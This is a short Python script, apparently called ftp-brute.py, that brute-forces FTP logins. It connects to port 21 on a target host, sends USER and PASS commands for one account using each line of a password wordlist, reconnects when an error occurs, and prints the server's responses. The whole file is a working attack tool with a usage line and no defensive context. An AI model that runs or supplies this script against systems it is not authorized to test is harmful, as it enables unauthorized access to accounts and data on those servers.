#/usr/bin/env python3

import socket
import re
import sys
import time

if len(sys.argv) < 3:
    print ("Use python3 ftp-brute.py 1.1.1.1 user file.txt")
    sys.exit(0)
user = sys.argv[2]
file = open(sys.argv[3])
def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 21))
    s.recv(1024)
    return s
s = conn()
print("Connection established.....")
for linha in file.readlines():
    time.sleep(1)
    if(linha != ""):
        try:
            usuario = "USER " + user + "\r\n"
            s.send(usuario.encode())
            s.recv(1024)
            linha = linha.strip()
            passw ="PASS "+ linha + "\r\n"
            s.send(passw.encode())
        except:
            s = conn()
            usuario = "USER " + user + "\r\n"
            s.send(usuario.encode())
            s.recv(1024)
            linha = linha.strip()
            passw ="PASS "+ linha + "\r\n"
            s.send(passw.encode())
        result = s.recv(1024)
        result = result.decode()
        print("Password:" + linha)
        print(result)

s.close()
